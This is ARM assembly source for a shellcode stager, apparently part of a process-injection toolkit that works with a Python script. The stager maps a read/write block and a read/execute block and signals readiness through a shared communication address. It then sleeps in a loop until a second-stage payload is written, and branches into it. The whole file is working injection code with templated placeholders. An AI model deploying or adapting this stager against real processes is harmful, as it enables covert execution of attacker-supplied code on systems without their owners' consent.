.globl _start
_start:
	// Save registers
	//stmdb sp!,{r0-r12}
	stmdb sp!,{r0-r11}
	//stmdb sp!,{lr}
	//add r6, sp, #0x4
	//sub sp, sp, #0x20
	
	b beginStager

beginStager:
	// allocate a new block of memory for read/write data using mmap
	// I don't know why, but calling sys_mmap fails, while using SYS_MMAP2 with the same parameters succeeds
	// Thanks Andrea Sindoni! (https://www.exploit-db.com/docs/english/43906-arm-exploitation-for-iot.pdf)
	mov r7, #192             					@ SYS_MMAP2
	mov r0, #0	            					@ addr
	mov r1, #[VARIABLE:READ_WRITE_BLOCK_SIZE:VARIABLE]  	@ len
	mov r2, #0x3            					@ prot (rw-)
	mov r3, #0x22            					@ flags (MAP_PRIVATE | MAP_ANONYMOUS)
	mov r4, #-1             					@ fd
	mov r5, #0              					@ offset
	swi 0x0										@ syscall
	mov r11, r0            						@ save mmap addr	- r11 = read/write block address

.balign 8
		
	// using GCC's own =relative_reference magic doesn't work when injecting the shellcode
	// so I rolled my own using this spaghetti code trick that's straight out of the early 80s
	// the branch instruction in this code is 4 bytes long, so I stash the string immediately after it
	// then I know that it will be 4 bytes after the program counter when it hits that line, 
	// which is exactly what the pc register will be set to
	ldr r12, [pc]
	b store_rw_block_address

communication_address:
	.word [VARIABLE:COMMUNICATION_ADDRESS:VARIABLE]
	.balign 4

store_rw_block_address:
	mov r9, r12
	add r9, r9, #8
	str r11, [r9]

	// allocate another new block of memory for read/execute data using mmap
	mov r7, #192             					@ SYS_MMAP2
	mov r0, #0	            					@ addr
	mov r1, #[VARIABLE:STAGE2_SIZE:VARIABLE]  	@ len
	mov r2, #0x5            					@ prot (r-x)
	mov r3, #0x22            					@ flags (MAP_PRIVATE | MAP_ANONYMOUS)
	mov r4, #-1             						@ fd
	mov r5, #0              					@ offset
	swi 0x0										@ syscall
	mov r10, r0            						@ save mmap addr	- r10 = read/execute block address

	// Store the read/execute block address returned by mmap
	mov r9, r12
	add r9, r9, #4
	str r10, [r9]

// overwrite communications address with [VARIABLE:STATE_READY_FOR_SHELLCODE_WRITE:VARIABLE]
// so that the Python script knows it can write stage 2 to memory

	ldr r0, [pc]
	b store_state_ready_for_shellcode_write

state_ready_for_shellcode_write:
	.word [VARIABLE:STATE_READY_FOR_SHELLCODE_WRITE:VARIABLE]
	.balign 4

store_state_ready_for_shellcode_write:
	str r0, [r12]

// load the value that indicates shellcode written into r8
	ldr r8, [pc]
	b begin_waiting1

state_shellcode_written:
	.word [VARIABLE:STATE_SHELLCODE_WRITTEN:VARIABLE]
	.balign 4

begin_waiting1:
	mov r5, pc
	b begin_waiting2

nanosleep_timespec:
	.word 1
	.balign 4

begin_waiting2:

// store the sys_nanosleep timer data
	mov r0, r5
	mov r1, r5

// wait for value at communications address to be [VARIABLE:STATE_SHELLCODE_WRITTEN:VARIABLE] before proceeding
wait_for_script:

	// sleep 1 second
	mov r7, #162             					@ sys_nanosleep
	mov r0, r5	            					@ seconds
	mov r1, r5  								@ nanoseconds
	swi 0x0										@ syscall

	ldr r7, [r12]
	cmp r7, r8
	beq launch_stage2
	
	b wait_for_script

launch_stage2:

	// jump to stage2
	bx r10

